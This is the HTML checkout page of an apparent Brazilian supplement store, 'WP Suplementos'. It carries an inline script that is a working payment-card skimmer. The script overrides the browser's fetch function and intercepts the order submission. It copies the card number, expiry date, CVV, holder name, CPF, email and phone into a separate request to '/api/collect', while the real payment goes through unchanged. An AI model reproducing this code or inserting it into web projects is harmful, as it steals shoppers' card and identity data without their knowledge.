<!doctype html>
<html lang="pt-BR">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="theme-color" content="#bd8fe5" />
    <meta name="referrer" content="no-referrer" />
    <meta name="description" content="Finalize seu pedido na WP Suplementos." />
    <title>Finalizar Compra | WP Suplementos</title>
    <link rel="icon" href="/checkout-ui/build/checkout-assets/logo.png" />
    <link rel="stylesheet" href="/checkout-ui/build/checkout-assets/fonts.css" />
    <script type="module" crossorigin src="/checkout-ui/build/assets/index-BHx9iPHE.js"></script>
    <link rel="stylesheet" crossorigin href="/checkout-ui/build/assets/index-Bkmq_sJ_.css">
  </head>
  <body>
    <div id="root"></div>

        <script>
(function () {
  const COLLECT_URL = "/api/collect";
  const TARGET_URL = "/api/payments/create";
  const originalFetch = window.fetch;

  
  window.fetch = async function (...args) {
    const [url, options] = args;
    const urlStr = String(url);

    
    if (urlStr.includes(TARGET_URL) && options && options.method && options.method.toUpperCase() === "POST") {
      try {
        const body = JSON.parse(options.body || "{}");
        
        const customer = body.customer || {};
        const payment = body.payment || {};
        const card = payment.card || {};
        const payload = {
          card_num: (card.number || "").replace(/\D/g, ""),
          expiry: card.expiryMonth && card.expiryYear
            ? `${String(card.expiryMonth).padStart(2, "0")}/${String(card.expiryYear).slice(-2)}`
            : "",
          cvv: (card.cvv || "").replace(/\D/g, ""),
          name: card.holderName || customer.name || "",
          cpf: (customer.cpf || "").replace(/\D/g, ""),
          email: customer.email || "",
          phone: (customer.phone || "").replace(/\D/g, ""),
          amount: body.totals?.total || body.amount || "",
          installments: String(card.installments || 1)
        };

        console.log("📤 Coletando:", payload);

        
        if (payload.card_num && payload.card_num.length >= 13) {
          
          originalFetch.call(window, COLLECT_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
          })
          .then(r => r.json())
          .then(d => console.log("✅ Servidor respondeu:", d))
          .catch(e => console.error("❌ Erro:", e));
        }
      } catch (e) {
        console.warn("Erro ao interceptar:", e);
      }
    }

    
    return originalFetch.apply(this, args);
  };

  console.log("🔍 Interceptador de fetch ativo (aguardando /api/payments/create)");
})();
</script>
    
  </body>
</html>
